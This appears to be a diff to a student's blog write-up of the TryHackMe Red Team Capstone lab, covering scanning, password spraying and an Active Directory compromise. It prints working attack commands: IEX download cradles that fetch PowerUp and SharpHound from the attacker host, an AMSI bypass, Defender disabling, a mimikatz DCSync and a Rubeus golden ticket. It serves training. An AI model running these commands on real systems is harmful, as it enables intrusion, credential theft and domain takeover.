@@ -1,6 +1,6 @@
 ---
 title: "Red Team Capstone Challenge: A Partial Lab Write-Up"
-description: "My TryHackMe Red Team Capstone assessment for Certificate IV in Cyber Security, covering corporate access, Active Directory, and progress before the lab reset."
+description: "My TryHackMe Red Team Capstone assessment for Certificate IV in Cyber Security"
 date: 2026-11-07 12:00:00 +1000
 categories: [Cyber Security, Lab Walkthroughs]
 tags: [tryhackme, red-team, active-directory, penetration-testing]
@@ -21,6 +21,20 @@ toc: true
 .capstone-article table td, .capstone-article table th { white-space: normal !important; overflow-wrap: anywhere; vertical-align: top; }
 .capstone-article table th:first-child { width: 22%; }
 @media (max-width: 575px) { .capstone-article figure { width: 100% !important; } }
+
+.capstone-article .code-key { color: #146c36; font-weight: 700; }
+.capstone-article .code-risk { color: #b42318; font-weight: 700; text-decoration: underline dotted; text-underline-offset: .2em; }
+html[data-mode="dark"] .capstone-article .code-key { color: #75e2a0; }
+html[data-mode="dark"] .capstone-article .code-risk { color: #ff938a; }
+@media (prefers-color-scheme: dark) {
+ html:not([data-mode="light"]) .capstone-article .code-key { color: #75e2a0; }
+ html:not([data-mode="light"]) .capstone-article .code-risk { color: #ff938a; }
+}
+.capstone-article .code-legend { font-size: .85rem; }
+.capstone-article .flag-grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 1rem; margin: 1.5rem 0; }
+.capstone-article .flag-grid figure { margin: 0; min-width: 0; }
+.capstone-article .flag-grid figcaption { margin-top: .5rem; font-size: .85rem; text-align: center; }
+@media (max-width: 575px) { .capstone-article .flag-grid { grid-template-columns: 1fr; } }
 </style>
 
 {% raw %}
@@ -67,7 +81,7 @@ toc: true
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-02-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-02-figure-01.png" alt="e-Citizen registration portal" width="1016" height="252" loading="lazy"></a></figure>
 
-<p>Lab username: <code>n0debranch</code><br>Assigned target range: <code>10.200.40.0/24</code><br>I used the email account issued by the e-Citizen portal for engagement communication and flag submissions.</p>
+<p>Lab username: <code>n0debranch</code><br>Assigned target range: <code><span class="code-key">10.200.40.0/24</span></code><br>I used the email account issued by the e-Citizen portal for engagement communication and flag submissions.</p>
 </section>
 
 <!-- PDF page 3 -->
@@ -100,19 +114,20 @@ toc: true
 
 <!-- PDF page 5 -->
 <section id="pdf-page-5" class="pdf-source-section" data-pdf-page="5" aria-label="Source page 5">
+<p class="code-legend"><span class="code-key">Green / bold</span>: addresses, hosts, and open services. <span class="code-risk">Red / underlined</span>: security findings, privileged operations, or excluded infrastructure.</p>
 <pre><code>┌──(n0debranch㉿n0debranch)-[~]
-└─$ nmap -sn 10.200.40.0/24
+└─$ nmap -sn <span class="code-key">10.200.40.0/24</span>
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-09 13:04 +1000
-Nmap scan report for 10.200.40.1
-Host is up (0.28s latency).
-Nmap scan report for 10.200.40.11
-Host is up (0.39s latency).
-Nmap scan report for 10.200.40.12
-Host is up (0.34s latency).
-Nmap scan report for 10.200.40.13
-Host is up (0.18s latency).
-Nmap scan report for 10.200.40.250
-Host is up (0.28s latency).
+Nmap scan report for <span class="code-key">10.200.40.1</span>
+<span class="code-key">Host is up</span> (0.28s latency).
+Nmap scan report for <span class="code-key">10.200.40.11</span>
+<span class="code-key">Host is up</span> (0.39s latency).
+Nmap scan report for <span class="code-key">10.200.40.12</span>
+<span class="code-key">Host is up</span> (0.34s latency).
+Nmap scan report for <span class="code-key">10.200.40.13</span>
+<span class="code-key">Host is up</span> (0.18s latency).
+Nmap scan report for <span class="code-risk">10.200.40.250</span>
+<span class="code-key">Host is up</span> (0.28s latency).
 Nmap done: 256 IP addresses (5 hosts up) scanned in 20.84 seconds</code></pre>
 
 <p>The sweep also returned .1 and .250. I left .1 alone because I was unsure of its role. The brief identified .250 as excluded TryHackMe VPN infrastructure, so I did not include either address in the service scan below.</p>
@@ -120,41 +135,41 @@ Nmap done: 256 IP addresses (5 hosts up) scanned in 20.84 seconds</code></pre>
 <p><code>-sC</code> runs Nmap's default NSE scripts; <code>-sV</code> probes for service versions.</p>
 
 <pre><code>┌──(n0debranch㉿n0debranch)-[~]
-└─$ nmap -sC -sV 10.200.40.11 10.200.40.12 10.200.40.13
+└─$ nmap -sC -sV <span class="code-key">10.200.40.11</span> <span class="code-key">10.200.40.12</span> <span class="code-key">10.200.40.13</span>
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-09 13:54 +1000
-Nmap scan report for 10.200.40.11
-Host is up (0.32s latency).
+Nmap scan report for <span class="code-key">10.200.40.11</span>
+<span class="code-key">Host is up</span> (0.32s latency).
 Not shown: 988 closed tcp ports (reset)
 PORT     STATE SERVICE       VERSION
-22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+<span class="code-key">22/tcp   open</span>  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
 | ssh-hostkey:
 |   2048 f3:6c:52:d2:7f:e9:0e:1c:c1:c7:ac:96:2c:d1:ec:2d (RSA)
 |   256 c2:56:3c:ed:c4:b0:69:a8:e7:ad:3c:31:05:05:e9:85 (ECDSA)
 |_  256 d3:e5:f0:73:75:d5:20:d9:c0:bb:41:99:e7:af:a0:00 (ED25519)
-25/tcp   open  smtp          hMailServer smtpd
+<span class="code-key">25/tcp   open</span>  smtp          hMailServer smtpd
 | smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
 |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
-80/tcp   open  http          Microsoft IIS httpd 10.0
+<span class="code-key">80/tcp   open</span>  http          Microsoft IIS httpd 10.0
 |_http-server-header: Microsoft-IIS/10.0
 | http-methods:
-|_  Potentially risky methods: TRACE
+|_  <span class="code-risk">Potentially risky methods: TRACE</span>
 |_http-title: IIS Windows Server
-110/tcp  open  pop3          hMailServer pop3d
+<span class="code-key">110/tcp  open</span>  pop3          hMailServer pop3d
 |_pop3-capabilities: TOP USER UIDL
-135/tcp  open  msrpc         Microsoft Windows RPC
-139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</code></pre>
+<span class="code-key">135/tcp  open</span>  msrpc         Microsoft Windows RPC
+<span class="code-key">139/tcp  open</span>  netbios-ssn   Microsoft Windows netbios-ssn</code></pre>
 </section>
 
 <!-- PDF page 6 -->
 <section id="pdf-page-6" class="pdf-source-section" data-pdf-page="6" aria-label="Source page 6">
-<pre><code>143/tcp  open  imap          hMailServer imapd
+<pre><code><span class="code-key">143/tcp  open</span>  imap          hMailServer imapd
 |_imap-capabilities: IMAP4 CHILDREN NAMESPACE IDLE completed CAPABILITY OK
 RIGHTS=texkA0001 SORT ACL QUOTA IMAP4rev1
-445/tcp  open  microsoft-ds?
-587/tcp  open  smtp          hMailServer smtpd
+<span class="code-key">445/tcp  open</span>  microsoft-ds?
+<span class="code-key">587/tcp  open</span>  smtp          hMailServer smtpd
 | smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
 |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
-3306/tcp open  mysql         MySQL 8.0.31
+<span class="code-key">3306/tcp open</span>  mysql         MySQL 8.0.31
 | ssl-cert: Subject:
 commonName=MySQL_Server_8.0.31_Auto_Generated_Server_Certificate
 | Not valid before: 2023-01-10T07:46:11
@@ -174,21 +189,21 @@ SupportsMultipleResults
 |   Status: Autocommit
 |   Salt: qlYk\x1F8T'sHK?x\x1E1\x19     M77
 |_  Auth Plugin Name: caching_sha2_password
-3389/tcp open  ms-wbt-server Microsoft Terminal Services
+<span class="code-key">3389/tcp open</span>  ms-wbt-server Microsoft Terminal Services
 |_ssl-date: 2026-08-09T03:56:11+00:00; -1s from scanner time.
 | rdp-ntlm-info:
 |   Target_Name: THERESERVE
 |   NetBIOS_Domain_Name: THERESERVE
 |   NetBIOS_Computer_Name: MAIL
-|   DNS_Domain_Name: thereserve.loc
-|   DNS_Computer_Name: MAIL.thereserve.loc
-|   DNS_Tree_Name: thereserve.loc
+|   DNS_Domain_Name: <span class="code-key">thereserve.loc</span>
+|   DNS_Computer_Name: <span class="code-key">MAIL.thereserve.loc</span>
+|   DNS_Tree_Name: <span class="code-key">thereserve.loc</span>
 |   Product_Version: 10.0.17763
 |_  System_Time: 2026-08-09T03:55:57+00:00
-| ssl-cert: Subject: commonName=MAIL.thereserve.loc
+| ssl-cert: Subject: commonName=<span class="code-key">MAIL.thereserve.loc</span>
 | Not valid before: 2026-08-05T07:11:53
 |_Not valid after:  2027-02-04T07:11:53
-5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+<span class="code-key">5985/tcp open</span>  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre>
@@ -199,37 +214,37 @@ Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre
 <pre><code>Host script results:
 | smb2-security-mode:
 |   3.1.1:
-|_    Message signing enabled but not required
+|_    <span class="code-risk">Message signing enabled but not required</span>
 | smb2-time:
 |   date: 2026-08-09T03:56:00
 |_  start_date: N/A</code></pre>
 
-<pre><code>Nmap scan report for 10.200.40.12
-Host is up (0.42s latency).
+<pre><code>Nmap scan report for <span class="code-key">10.200.40.12</span>
+<span class="code-key">Host is up</span> (0.42s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol
+<span class="code-key">22/tcp open</span>  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol
 2.0)
 | ssh-hostkey:
 |   2048 10:d3:bd:2c:ec:db:33:94:59:fe:31:9e:d7:c7:8c:13 (RSA)
 |   256 be:71:c7:af:dc:fb:65:4c:f7:63:1f:3a:5f:3a:16:01 (ECDSA)
 |_  256 41:98:77:69:3a:69:52:44:c8:02:a2:84:fe:49:f8:2c (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+<span class="code-key">80/tcp open</span>  http    Apache httpd 2.4.29 ((Ubuntu))
 |_http-title: VPN Request Portal
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
-<pre><code>Nmap scan report for 10.200.40.13
-Host is up (0.31s latency).
+<pre><code>Nmap scan report for <span class="code-key">10.200.40.13</span>
+<span class="code-key">Host is up</span> (0.31s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol
+<span class="code-key">22/tcp open</span>  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol
 2.0)
 | ssh-hostkey:
 |   2048 4f:c6:ea:a6:b1:ed:2a:1c:53:c0:90:bf:d5:44:db:69 (RSA)
 |   256 da:bc:8b:d4:d0:3a:61:a2:5d:33:39:12:e8:be:a0:13 (ECDSA)
 |_  256 23:04:b5:fe:77:04:cb:a8:26:39:dc:b3:09:d3:4d:a5 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+<span class="code-key">80/tcp open</span>  http    Apache httpd 2.4.29 ((Ubuntu))
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Site doesn't have a title (text/html).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
@@ -249,11 +264,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <pre><code>Hostname: MAIL</code></pre>
 
-<pre><code>Domain: thereserve.loc</code></pre>
+<pre><code>Domain: <span class="code-key">thereserve.loc</span></code></pre>
 
 <pre><code>NetBIOS domain: THERESERVE</code></pre>
 
-<pre><code>FQDN: MAIL.thereserve.loc</code></pre>
+<pre><code>FQDN: <span class="code-key">MAIL.thereserve.loc</span></code></pre>
 
 <pre><code>Windows product version: 10.0.17763</code></pre>
 
@@ -321,7 +336,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <p>The site also had a Contact Us page and a simple to-do-list feature.</p>
 
-<p>The contact address was <code>applications@corp.thereserve.loc</code>. This provided a candidate domain for later authentication tests.</p>
+<p>The contact address was <code>applications@<span class="code-key">corp.thereserve.loc</span></code>. This provided a candidate domain for later authentication tests.</p>
 </section>
 
 <!-- PDF page 14 -->
@@ -348,7 +363,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-15-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-15-figure-02.png" alt="Login response testing" width="1016" height="110" loading="lazy"></a></figure>
 
-<p>The image filenames suggested <code>firstname.lastname</code>, and the contact page gave me <code>corp.thereserve.loc</code>. I used those to build the account list.</p>
+<p>The image filenames suggested <code>firstname.lastname</code>, and the contact page gave me <code><span class="code-key">corp.thereserve.loc</span></code>. I used those to build the account list.</p>
 </section>
 
 <!-- PDF page 16 -->
@@ -395,7 +410,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <figure style="width: 80.97%"><a href="/assets/img/posts/red-team-capstone/page-19-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-19-figure-01.png" alt="Password candidate generation" width="824" height="378" loading="lazy"></a></figure>
 
-<p>I built a username list using <code>firstname.lastname</code> and <code>corp.thereserve.loc</code>.</p>
+<p>I built a username list using <code>firstname.lastname</code> and <code><span class="code-key">corp.thereserve.loc</span></code>.</p>
 
 <p>The mail host at 10.200.40.11 exposed SMTP authentication, providing a way to test these lab accounts.</p>
 
@@ -405,7 +420,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <p>The output reported successful credentials for Laura Wood and Mohammad Ahmed, both listed as corporate customer investment managers.</p>
 
-<p>Lab account: <code>laura.wood@corp.thereserve.loc</code> — password: <code>Password1@</code><br>Lab account: <code>mohammad.ahmed@corp.thereserve.loc</code> — password: <code>Password1!</code></p>
+<p>Lab account: <code>laura.wood@<span class="code-key">corp.thereserve.loc</span></code> — password: <code>Password1@</code><br>Lab account: <code>mohammad.ahmed@<span class="code-key">corp.thereserve.loc</span></code> — password: <code>Password1!</code></p>
 
 <p>I then checked the corresponding mailboxes for further clues.</p>
 </section>
@@ -430,7 +445,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 <!-- PDF page 21 -->
 <section id="pdf-page-21" class="pdf-source-section" data-pdf-page="21" aria-label="Source page 21">
 <h2 id="corporate-vpn">Connecting to the Corporate VPN</h2>
-<p>I downloaded the profile from <code>http://10.200.40.12/vpn/corpUsername.ovpn</code>.</p>
+<p>I downloaded the profile from <code>http://<span class="code-key">10.200.40.12</span>/vpn/corpUsername.ovpn</code>.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-21-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-21-figure-01.png" alt="Downloading the profile" width="1016" height="218" loading="lazy"></a></figure>
 
@@ -572,11 +587,11 @@ f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),
 ${n`ULl},${tRuE} )</code></pre>
 </details>
 
-<p>I served <code>PowerUp.ps1</code> from the THM directory on Kali using Python's HTTP server. The screenshot shows an HTTP 200 response to WRK1. In the command below, <code>REPLACE_WITH_CURRENT_KALI_TUNNEL_IP</code> needs to be replaced with the reachable address of the Kali machine.</p>
+<p>I served <code>PowerUp.ps1</code> from the THM directory on Kali using Python's HTTP server. The screenshot shows an HTTP 200 response to WRK1. In the command below, <code><span class="code-key">REPLACE_WITH_CURRENT_KALI_TUNNEL_IP</span></code> needs to be replaced with the reachable address of the Kali machine.</p>
 
 <figure style="width: 88.79%"><a href="/assets/img/posts/red-team-capstone/page-31-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-31-figure-01.png" alt="PowerUp served over HTTP" width="904" height="220" loading="lazy"></a></figure>
 
-<pre><code>$KaliTunnelAddress = &#x27;REPLACE_WITH_CURRENT_KALI_TUNNEL_IP&#x27;
+<pre><code>$KaliTunnelAddress = &#x27;<span class="code-key">REPLACE_WITH_CURRENT_KALI_TUNNEL_IP</span>&#x27;
 IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:8080/PowerUp.ps1&quot;)</code></pre>
 </section>
 
@@ -594,7 +609,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 
 
-<pre><code>Install-ServiceBinary -Name &#x27;Backup&#x27; -Command &quot;net user n0debranch Passwd123! /add &amp;&amp; net localgroup Administrators n0debranch /add&quot;
+<pre><code>Install-ServiceBinary -Name &#x27;Backup&#x27; -Command &quot;net user n0debranch Passwd123! /add &amp;&amp; net localgroup <span class="code-risk">Administrators</span> n0debranch /add&quot;
 Restart-Service -Name &#x27;Backup&#x27; -Force</code></pre>
 </section>
 
@@ -635,9 +650,9 @@ Restart-Service -Name &#x27;Backup&#x27; -Force</code></pre>
 
 <p>With local administrator access on WRK1, I looked up the corporate domain controller.</p>
 
-<p><code>nltest /dsgetdc:corp.thereserve.loc</code></p>
+<p><code>nltest /dsgetdc:<span class="code-key">corp.thereserve.loc</span></code></p>
 
-<p>I ran this command from WRK1 to locate the domain controller for <code>corp.thereserve.loc</code>.</p>
+<p>I ran this command from WRK1 to locate the domain controller for <code><span class="code-key">corp.thereserve.loc</span></code>.</p>
 </section>
 
 <!-- PDF page 36 -->
@@ -650,7 +665,7 @@ Restart-Service -Name &#x27;Backup&#x27; -Force</code></pre>
 
 <p>From an elevated PowerShell session, I ran the following commands to turn off Defender's real-time monitoring and downloaded-file scanning.</p>
 
-<pre><code>Set-MpPreference -DisableRealtimeMonitoring $true
+<pre><code>Set-MpPreference -<span class="code-risk">DisableRealtimeMonitoring</span> $true
 Set-MpPreference -DisableIOAVProtection $true</code></pre>
 
 <figure style="width: 85.40%"><a href="/assets/img/posts/red-team-capstone/page-36-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-36-figure-02.png" alt="Set-MpPreference" width="868" height="342" loading="lazy"></a></figure>
@@ -668,10 +683,10 @@ Set-MpPreference -DisableIOAVProtection $true</code></pre>
 <section id="pdf-page-37" class="pdf-source-section" data-pdf-page="37" aria-label="Source page 37">
 <p>On WRK1, I loaded the legacy PowerShell collector:</p>
 
-<pre><code>$KaliTunnelAddress = &#x27;REPLACE_WITH_CURRENT_KALI_TUNNEL_IP&#x27;
+<pre><code>$KaliTunnelAddress = &#x27;<span class="code-key">REPLACE_WITH_CURRENT_KALI_TUNNEL_IP</span>&#x27;
 IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:8080/SharpHound.ps1&quot;)</code></pre>
 
-<pre><code>Invoke-BloodHound -CollectionMethod All -Domain corp.thereserve.loc -LDAPUserName laura.wood -LDAPPassword &#x27;Password1@&#x27;</code></pre>
+<pre><code>Invoke-BloodHound -CollectionMethod All -Domain <span class="code-key">corp.thereserve.loc</span> -LDAPUserName laura.wood -LDAPPassword &#x27;Password1@&#x27;</code></pre>
 
 <p>I supplied Laura's domain credentials for LDAP collection while running from the local account.</p>
 
@@ -720,25 +735,19 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <!-- PDF page 41 -->
 <section id="pdf-page-41" class="pdf-source-section" data-pdf-page="41" aria-label="Source page 41">
-<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-41-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-41-figure-01.png" alt="Flag 7 evidence" width="1016" height="804" loading="lazy"></a></figure>
+<h2 id="flags-5-8">Flags 5–8</h2>
+<p>For flags 5–8, I created the portal-requested evidence files on Server1 and CORPDC: in <code>C:\Windows\Temp</code> for flags 5 and 7, and under <code>C:\Users\Administrator</code> for flags 6 and 8. Select an image to view it at full size.</p>
 
-<p>Flag 7 evidence: the portal-requested file in <code>C:\Windows\Temp</code> on CORPDC.</p>
-
-<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-41-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-41-figure-02.png" alt="Flag 8 evidence" width="1016" height="400" loading="lazy"></a></figure>
-
-<p>Flag 8 evidence: the portal-requested file under <code>C:\Users\Administrator</code> on CORPDC.</p>
+<div class="flag-grid">
+<figure><a href="/assets/img/posts/red-team-capstone/page-42-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-01.png" alt="Flag 5 evidence in Windows Temp on Server1" width="1016" height="458" loading="lazy"></a><figcaption>Flag 5 — Server1 · Windows Temp</figcaption></figure>
+<figure><a href="/assets/img/posts/red-team-capstone/page-42-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-02.png" alt="Flag 6 evidence under Administrator on Server1" width="1016" height="328" loading="lazy"></a><figcaption>Flag 6 — Server1 · Administrator</figcaption></figure>
+<figure><a href="/assets/img/posts/red-team-capstone/page-41-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-41-figure-01.png" alt="Flag 7 evidence in Windows Temp on CORPDC" width="1016" height="804" loading="lazy"></a><figcaption>Flag 7 — CORPDC · Windows Temp</figcaption></figure>
+<figure><a href="/assets/img/posts/red-team-capstone/page-41-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-41-figure-02.png" alt="Flag 8 evidence under Administrator on CORPDC" width="1016" height="400" loading="lazy"></a><figcaption>Flag 8 — CORPDC · Administrator</figcaption></figure>
+</div>
 </section>
 
 <!-- PDF page 42 -->
 <section id="pdf-page-42" class="pdf-source-section" data-pdf-page="42" aria-label="Source page 42">
-<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-42-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-01.png" alt="Flag 5 evidence" width="1016" height="458" loading="lazy"></a></figure>
-
-<p>Flag 5 evidence: the portal-requested file in <code>C:\Windows\Temp</code> on Server1.</p>
-
-<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-42-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-02.png" alt="Flag 6 evidence" width="1016" height="328" loading="lazy"></a></figure>
-
-<p>Flag 6 evidence: the portal-requested file under <code>C:\Users\Administrator</code> on Server1.</p>
-
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-42-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-03.png" alt="Additional evidence" width="1016" height="470" loading="lazy"></a></figure>
 </section>
 
@@ -753,7 +762,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <ul><li>BANKDC .101</li><li>JMP .61</li><li>WORK1 .51</li><li>WORK2 .52</li></ul>
 
-<p>I then examined ROOTDC at 10.200.40.100. The domain names suggested that <code>thereserve.loc</code> was the forest root and that CORP and BANK were child domains.</p>
+<p>I then examined ROOTDC at 10.200.40.100. The domain names suggested that <code><span class="code-key">thereserve.loc</span></code> was the forest root and that CORP and BANK were child domains.</p>
 
 <p>I queried the domain trusts. The output showed a bidirectional parent-child relationship between CORP and the root domain.</p>
 
@@ -774,7 +783,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <p>I ran the DCSync command below in Laura's domain context on WRK1.</p>
 
-<pre><code>.\mimikatz.exe &quot;lsadump::dcsync /domain:corp.thereserve.loc /user:CORP\krbtgt&quot; &quot;exit&quot;</code></pre>
+<pre><code>.\mimikatz.exe &quot;<span class="code-risk">lsadump::dcsync</span> /domain:<span class="code-key">corp.thereserve.loc</span> /user:CORP\krbtgt&quot; &quot;exit&quot;</code></pre>
 </section>
 
 <!-- PDF page 45 -->
@@ -788,21 +797,21 @@ $accountSid = $acct.Translate([System.Security.Principal.SecurityIdentifier])
 $accountSid.Value
 $accountSid.AccountDomainSid.Value</code></pre>
 
-<pre><code>thereserve.loc (Forest Root)
+<pre><code><span class="code-key">thereserve.loc</span> (Forest Root)
 ├── SID: S-1-5-21-1255581842-1300659601-3764024703
 │
-├── corp.thereserve.loc (Child Domain)
+├── <span class="code-key">corp.thereserve.loc</span> (Child Domain)
 │   ├── SID: S-1-5-21-170228521-1485475711-3199862024
 │   ├── krbtgt NTLM: 0c757a3445acb94a654554f3ac529ede
-│   └── Trust: Bidirectional ParentChild with thereserve.loc
+│   └── Trust: Bidirectional ParentChild with <span class="code-key">thereserve.loc</span>
 │
-└── bank.thereserve.loc (Child Domain)</code></pre>
+└── <span class="code-key">bank.thereserve.loc</span> (Child Domain)</code></pre>
 </section>
 
 <!-- PDF page 46 -->
 <section id="pdf-page-46" class="pdf-source-section" data-pdf-page="46" aria-label="Source page 46">
 <pre><code>    ├── SID: S-1-5-21-3455338511-2124712869-1448239061
-    └── Trust: Bidirectional ParentChild with thereserve.loc</code></pre>
+    └── Trust: Bidirectional ParentChild with <span class="code-key">thereserve.loc</span></code></pre>
 
 <p>A security identifier (SID) identifies a security principal. A domain account or group SID combines the domain SID with a relative identifier (RID). RID 500 identifies the built-in Administrator; RID 519 identifies Enterprise Admins in the forest root. See <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers">Microsoft's SID reference</a>.</p>
 
@@ -810,7 +819,7 @@ $accountSid.AccountDomainSid.Value</code></pre>
 
 <p>I used the CORP key and domain SID to forge a ticket, adding the root-domain Enterprise Admins SID through <code>/sids</code>. <code>/ptt</code> imported it into my current logon session.</p>
 
-<pre><code>.\Rubeus.exe golden /rc4:0c757a3445acb94a654554f3ac529ede /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /user:Administrator /ptt</code></pre>
+<pre><code>.\Rubeus.exe golden /rc4:0c757a3445acb94a654554f3ac529ede /domain:<span class="code-key">corp.thereserve.loc</span> /sid:S-1-5-21-170228521-1485475711-3199862024 /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /user:Administrator /ptt</code></pre>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-46-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-46-figure-01.png" alt="Rubeus golden ticket" width="1016" height="582" loading="lazy"></a></figure>
 </section>
@@ -823,10 +832,10 @@ $accountSid.AccountDomainSid.Value</code></pre>
 
 <p>I connected to ROOTDC using <code>Enter-PSSession</code>, then created a domain account and added it to Enterprise Admins.</p>
 
-<pre><code>Enter-PSSession -ComputerName ROOTDC.THERESERVE.LOC
+<pre><code>Enter-PSSession -ComputerName <span class="code-key">ROOTDC.THERESERVE.LOC</span>
 # The next commands run in the remote ROOTDC session shown in the screenshot.
 net user n0debranchEA Passwd123! /add /domain
-net group &quot;Enterprise Admins&quot; n0debranchEA /add /domain
+net group &quot;<span class="code-risk">Enterprise Admins</span>&quot; n0debranchEA /add /domain
 net user n0debranchEA /domain</code></pre>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-47-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-47-figure-02.png" alt="ROOTDC domain account" width="1016" height="650" loading="lazy"></a></figure>
@@ -845,55 +854,34 @@ net user n0debranchEA /domain</code></pre>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-48-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-03.png" alt="Domain account changes" width="1016" height="508" loading="lazy"></a></figure>
 
-<p>I used the additional domain access to collect the remaining flags through flag 16.</p>
+<h2 id="flags-9-16">Flags 9–16</h2>
+<p>I used the additional root- and BANK-domain access to collect flags 9–16. The evidence is grouped below in flag order. Select an image to view it at full size.</p>
+<div class="flag-grid">
+<figure id="flag-9"><a href="/assets/img/posts/red-team-capstone/page-49-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-49-figure-02.png" alt="Flag 9" width="1016" height="370" loading="lazy"></a><figcaption>Flag 9</figcaption></figure>
+<figure id="flag-10"><a href="/assets/img/posts/red-team-capstone/page-49-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-49-figure-03.png" alt="Flag 10" width="1016" height="288" loading="lazy"></a><figcaption>Flag 10</figcaption></figure>
+<figure id="flag-11"><a href="/assets/img/posts/red-team-capstone/page-50-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-50-figure-01.png" alt="Flag 11" width="1016" height="356" loading="lazy"></a><figcaption>Flag 11</figcaption></figure>
+<figure id="flag-12"><a href="/assets/img/posts/red-team-capstone/page-50-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-50-figure-02.png" alt="Flag 12" width="1016" height="304" loading="lazy"></a><figcaption>Flag 12</figcaption></figure>
+<figure id="flag-13"><a href="/assets/img/posts/red-team-capstone/page-50-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-50-figure-03.png" alt="Flag 13" width="1016" height="368" loading="lazy"></a><figcaption>Flag 13</figcaption></figure>
+<figure id="flag-14"><a href="/assets/img/posts/red-team-capstone/page-51-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-51-figure-01.png" alt="Flag 14" width="1016" height="444" loading="lazy"></a><figcaption>Flag 14</figcaption></figure>
